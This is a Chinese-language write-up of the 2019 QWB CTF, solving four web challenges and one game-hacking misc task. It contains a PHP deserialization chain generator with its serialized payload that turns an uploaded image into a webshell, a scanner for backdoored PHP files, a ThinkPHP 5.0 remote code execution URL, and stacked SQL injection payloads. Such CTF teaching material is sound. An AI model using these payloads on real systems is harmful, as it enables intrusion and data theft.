# 2019强网杯
本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|难|

# 网上公开WP:
+ https://www.zhaoj.in/read-5873.html
+ https://altman.vip/2019/05/27/QWB2019-writeup/

# 题目下载：
+ https://github.com/glzjin/qwb_2019_smarthacker
+ https://github.com/glzjin/qwb_2019_upload

# 本站备份WP
**感谢作者: Glzjin、Donek1**
## Web
### UPLOAD

知识点：代码审计，PHP 反序列化。

步骤：

1.先打开靶机看看。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588315116632a22379b951bd03488e1f540824a3-1024x610.png)

2.看起来是个登录和注册页面，那么就先注册然后登录试试吧。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316155ab45b21322b64c03cfbd8142644d0aa-874x1024.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883162455655488de7893bff5614210c25c7f7c.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316482c048c42c816c7619e902ba7ad6a2b3d-926x1024.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588316607f0bbaeaad2bb13fedf5a1259baf95b8.png)

3.登录之后看到这样一个页面，测了一下只能上传能被正常查看的 png。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883185208dd35b4766dc02ee91983d15ec3f94f-1024x687.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588318636c3e97cf680f218d022c876c0e8e148b.png)

4.跳转到了一个新的页面，这个页面似乎没有任何实际功能了。然后可以看到我们图片是正确被上传到服务器上的 /upload/da5703ef349c8b4ca65880a05514ff89/ 下了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588318903e74b4fc7850d13dde50cb1d8ab12301-1024x570.png)

5.然后我们来扫扫敏感文件，发现 `/www.tar.gz` 下有内容（其实是从第二题得到的提示），下载下来解压看看，发现是 ThinkPHP 5 框架写的。

www.tar.gz[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/15588320959d0a5958211037910e55ab9d4a45ccc1.gz)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832218cad9f782eda9b653f9e195efc63cf59a-1024x613.png)

6.而且其有 .idea 目录，我们将其导入到 PHPStorm 看看吧。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832287668bb7a6a66e7968ff875b7a84d2b813-1024x626.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832287668bb7a6a66e7968ff875b7a84d2b813.png)

7.发现其在 `application/web/controller/Register.php` 和 `application/web/controller/Index.php` 下有两个断点，很诡异，估计是 Hint 了。

application/web/controller/Register.php：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832405f820b22bee73719de7d597b312004cd2.png)

application/web/controller/Index.php：

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588323518efcf869541b8638db34f86a0fed9622-1024x303.png)

8.看了看，发现这两个点的流程大概如下。

`application/web/controller/Index.php` 里的：

首先访问大部分页面例如 index 都会调用 login_check 方法。

该方法会先将传入的用户 Profile 反序列化，而后到数据库中检查相关信息是否一致。

`application/web/controller/Register.php` 里的：

Register 的析构方法，估计是想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法，也就是跳到主页了。

9.然后再来审一下其他代码，发现上传图片的主要逻辑在 `application/web/controller/Profile.php` 里。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558832931289f7b7dd7dca7839b5bac4f0835ac0e-1024x572.png)

先检查是否登录，然后判断是否有文件，然后获取后缀，解析图片判断是否为正常图片，再从临时文件拷贝到目标路径。

而 Profile 有 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883378645e1badb77713a21a54e9696f5a738dd-1024x626.png)

看起来似乎天衣无缝。

但别忘了前面我们有反序列化和析构函数的调用，结合这三个地方我们就可以操控 Profile 里的参数，控制其中的 upload_img 方法，这样我们就能任意更改文件名，让其为我们所用了。

11.首先用蚁剑生成个马，再用 hex  编辑器构造个图片马，注册个新号上传上去。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588333581865d65bcc00cad9fab6156cd2d24b6b-1024x688.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883342647b20e3e79d8a790485cdde46ac35e1b-1024x647.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558833505be82461dd72b9f059ba85653fb4cec53-1024x601.png)

12.然后构造一个 Profile 和 Register 类，命名空间 app\web\controller（要不然反序列化会出错，不知道对象实例化的是哪个类）。然后给其 except 成员变量赋值 ['index' =&gt; 'img']，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558834087d842ce0a929a743be2662806866a0a39-1024x629.png)

而后我们又赋值控制 filename_tmp 和 filename 成员变量。可以看到前面两个判断我们只要不赋值和不上传变量即可轻松绕过。ext 这里也要赋值，让他进这个判断。而后程序就开始把  filename_tmp 移动到 filename，这样我们就可以把 png 移动为 php 文件了。

而后，我们还要构造一个 Register，checker 赋值为 我们上面这个 $profile，registed 赋值为 false，这样在这个对象析构时就会调用 profile 的 index 方法，再跳到 upload_img 了。

 13.最终 Poc 生成脚本如下，PHP 的。
```
<?php
namespace app\web\controller;

class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}

$profile = new Profile();
$profile->except = ['index' => 'img'];
$profile->img = "upload_img";
$profile->ext = "png";
$profile->filename_tmp = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.png";
$profile->filename = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.php";

$register = new Register();
$register->registed = false;
$register->checker = $profile;

echo urlencode(base64_encode(serialize($register)));`
```

注意这里的文件路劲，看 Profile 的构造方法有切换路径，这里我们反序列化的话似乎不会调用构造方法，所以得自己指定一下路径。

14.运行，得到 Poc。

```
TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkL2RhNTcwM2VmMzQ5YzhiNGNhNjU4ODBhMDU1MTRmZjg5L2U2ZTljNDgzNjg3NTJiMjYwOTE0YTkxMGJlOTA0MjU3LnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC9kYTU3MDNlZjM0OWM4YjRjYTY1ODgwYTA1NTE0ZmY4OS9lNmU5YzQ4MzY4NzUyYjI2MDkxNGE5MTBiZTkwNDI1Ny5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9
```

15.然后置 coookie。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558834498e3c796623859fe12a523e3fea49af8ab-1024x784.png)

16.刷新页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588345217ba8d594e1161251c60db4e34f763b17-1024x555.png)

17.可以看到我们的小马已经能访问了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883455117b71285b8a3392e8233c7de7311cde3-1024x411.png)

18.然后蚁剑连上，打开 /flag 文件。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588346181bd8fa356b22e840d4296f217666ebe8-1024x688.png)

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588346387ab9fa88b0dc076a1d83a02110c62ea1-1024x688.png)

19.Flag 到手~

### 高明的黑客

知识点：代码审计，动态测试

步骤：

1.打开靶机，是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835272fd70292e56dc92e7b063263780c6de81-1024x211.png)

2.那就下载源码吧。

[下载](https://www.zhaoj.in/wp-content/uploads/2019/05/155883536268cab8ffa70daa14e59a5941c55461ab.gz)

3.来看看，发现大部分文件都是一些垃圾代码，难以解读。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835400d75a27d6992ead8e8723ec35a14a740d-1024x804.png)

但有些地方是能看的，比如

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155883542371663e53d48fb28b5574ca913ba4c2ed.png)

前头赋值，神仙难救。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835445834b884adfc23e438c0e0724130e10a2.png)

神仙难救。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835627a0a378ce6daac5a406ae906c738b21d7.png)

神仙难救。

4.但总有些地方可用的，来写个脚本批量扫描一下 _GET 和 _POST，给他们传一些特定的代码(比如 echo("glzjin"); /echo("glzjin") / echo glzjin，eval，assert，system 函数需要分别处理，一个文件需要用几种姿势多测几次)看看能执行不，能执行返回这种特定的字符串就说明此处可用。

Python 脚本如下：

```
import os
import threading
from concurrent.futures.thread import ThreadPoolExecutor

import requests

session = requests.Session()

path = "/Users/jinzhao/PhpstormProjects/qwb/web2/"  # 文件夹目录
files = os.listdir(path)  # 得到文件夹下的所有文件名称

mutex = threading.Lock()
pool = ThreadPoolExecutor(max_workers=50)

def read_file(file):
    f = open(path + "/" + file);  # 打开文件
    iter_f = iter(f);  # 创建迭代器
    str = ""
    for line in iter_f:  # 遍历文件，一行行遍历，读取文本
        str = str + line

    # 获取一个页面内所有参数
    start = 0
    params = {}
    while str.find("$_GET['", start) != -1:
        pos2 = str.find("']", str.find("$_GET['", start) + 1)
        var = str[str.find("$_GET['", start) + 7: pos2]
        start = pos2 + 1

        params[var] = 'echo("glzjin");'

        # print(var)

    start = 0
    data = {}
    while str.find("$_POST['", start) != -1:
        pos2 = str.find("']", str.find("$_POST['", start) + 1)
        var = str[str.find("$_POST['", start) + 8: pos2]
        start = pos2 + 1

        data[var] = 'echo("glzjin");'

        # print(var)

    # eval test
    r = session.post('http://localhost:11180/web2/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # assert test
    for i in params:
        params[i] = params[i][:-1]

    for i in data:
        data[i] = data[i][:-1]

    r = session.post('http://localhost:11180/web2/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # system test
    for i in params:
        params[i] = 'echo glzjin'

    for i in data:
        data[i] = 'echo glzjin'

    r = session.post('http://localhost:11180/web2/' + file, data=data, params=params)
    if r.text.find('glzjin') != -1:
        mutex.acquire()
        print(file + " found!")
        mutex.release()

    # print("====================")

for file in files:  # 遍历文件夹
    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开
        # read_file(file)

        pool.submit(read_file, file)

```

5.然后在本地开个 PHP 服务器。

> /usr/bin/php -S localhost:11180 -t /Users/jinzhao/PhpstormProjects/qwb

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835730ae911ad0e232535244aa4161081c6092-1024x191.png)

6.运行脚本，开扫，扫到一个咯~

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835861a07aab06b0dd3c5c0ca5f0d6941a721e-1024x128.png)

7.去这个文件里看看。这一段是关键，拼接了一个 System  出来调用 Efa5BVG 这个参数。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558835902b176094d2d7d236cc96ffe305e6e5d32-1024x346.png)

8.OK，那么就来试试读取 flag 吧。访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588359964fd8d1dc8b2264e7eedaedb29fd8f327-1024x133.png)

9. Flag 到手~

### 上单

知识点：通用组件已知漏洞熟悉度- -？

1.打开靶机，发现似乎可以遍历目录。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588630365222ff84e669c9f4d67603d9182e1cce.png)

2.点进去看看，似乎是 ThinkPHP。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558863068360f8c91911146043d6ef94e04754fb9.png)

3.看看 Readme，似乎是 ThinkPHP 5.0?

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558863271a0280aefb5cf6d17d0bb028cdb021ced-1024x855.png)

4.直接上次去防灾打比赛的 payload 一把梭。

`/1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155886333377c0f22d589fc77be54e46e40d55a34f-1024x100.png)

5. Flag 到手~

### 随便注

知识点：堆叠注入

步骤：

1.打开靶机，发现是这样一个页面。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588772236949e6ef54f82dbde3dc40ff3881b530-1024x239.png)

2.然后提交试试。发现似乎是直接把返回的原始数据给返回了。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155887735899e0ead8aeecbbcfbb05d29796da4dff-1024x412.png)

3.然后来测试一下有没有注入，似乎是有的。

`/?inject=1%27or+%271%27%3D%271
/?inject=1' or '1'='1`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558877587d94b7f6fde49a61ec1cb2bdd929e7122-1024x753.png)

4.来检查一下过滤情况，过滤函数如下。

![](https://www.zhaoj.in/wp-content/uploads/2019/05/155887769840011b0dcc021be32d8fb64955e080b1-1024x221.png)

过滤了 select，update，delete，drop，insert，where 和 点。

5.咦，过滤了那么些词，是不是有堆叠注入？一测，还真有。下面列出数据库试试。

```
/?inject=222%27%3Bshow+databases%3B%23
/?inject=222';show databases;#
```

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558877945ef512666a7f31f73119a0a6bb253e24c-1024x588.png)

6. OK,可以。那看看有啥表。

`/?inject=222%27%3Bshow+tables%3B%23
/?inject=222';show tables;#`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878266092f2e11111c57946135801d4c4d75da-1024x505.png)

7.来看看这个数字为名字的表里有啥。看来 flag 在这了。

`/?inject=222%27%3Bshow+columns%20from%20`1919810931114514`%3B%23
/?inject=222';show columns from `1919810931114514`;#`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878322f559521d405818004e5652567e90cde5-1024x639.png)

8.然后是 words 表，看起来就是默认查询的表了。

`/?inject=222%27%3Bshow+columns%20from%20`words`%3B%23
/?inject=222';show columns from `words`;#`

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588784806bdfdf08f05e3715a7e20cb70c5dc706-1024x910.png)

9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。

先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。

这样就可以让程序直接查询出 flag 了。

10.构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。（改表名那里直接从 pma 拷了一个语句过来改- -）

```
/?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;#
```
```
/?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#`
```

![](https://www.zhaoj.in/wp-content/uploads/2019/05/1558878854cebb31f09962fa4807dd9846d0df86e8-1024x821.png)

11.用 `1' or '1'='1 `访问一下。

`/?inject=1%27+or+%271%27%3D%271#
/?inject=1' or '1'='1

![](https://www.zhaoj.in/wp-content/uploads/2019/05/15588789483e5ae94244cef60da3688fab16d8502b-1024x387.png)

12. Flag 到手~

## MISC
### 鲲or鳗orGame
两首歌（鸡你太美，大碗宽面还挺好听），一个游戏

题目说选一个，二首歌一个游戏，那先选游戏把

想把游戏直接通关，但是网页好像不太好操作

看看游戏页面源码

![](https://cy-pic.kuaizhan.com/g3/ce/11/2fef-5b1d-4aa5-83ef-4a17b0c56b3a47)

试试能不能直接看js目录，是可以的，搜索有用信息

mobile.js里看到

![](https://cy-pic.kuaizhan.com/g3/0f/a5/443b-7b6b-4609-ba75-7516ae62862525)

game.gb（附件）应该就是游戏了，下载下来，百度搜了一下是GAMEBOY文件

下了个模拟器运行游戏，然后百度都会有说金手指，模拟器

![](https://cy-pic.kuaizhan.com/g3/87/47/ab12-a748-4818-bfaa-10e2a9085a6647)

查查就是个修改器之类的，但这个模拟器里的不太会用，想着改数值，但这里好像只能插入，换了一个

开始游戏（手残，基本只能过1个，所以卡了试了很久）

每次结束开金手指搜几次通过的个数

第一次：过一个

![](https://cy-pic.kuaizhan.com/g3/81/65/2a82-b5e0-4ae8-8202-5610bc4a324e51)

第二次：过两个

![](https://cy-pic.kuaizhan.com/g3/3b/44/617a-5839-46ed-8fff-2455beb2005f33)

那就把两个地址的数值改到最大 FF

分别应用两个金手指，发现第一个，在开始到结束，结束的时候，就出了flag，但是一会就没了，还好手速快
 
![](https://cy-pic.kuaizhan.com/g3/44/23/4053-9117-4483-b482-613868ef248e96)

## Crypto
未联系到作者：请移步至：https://altman.vip/2019/05/27/QWB2019-writeup/#BABYBANK

# 评论区
**请文明评论，禁止广告**
<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---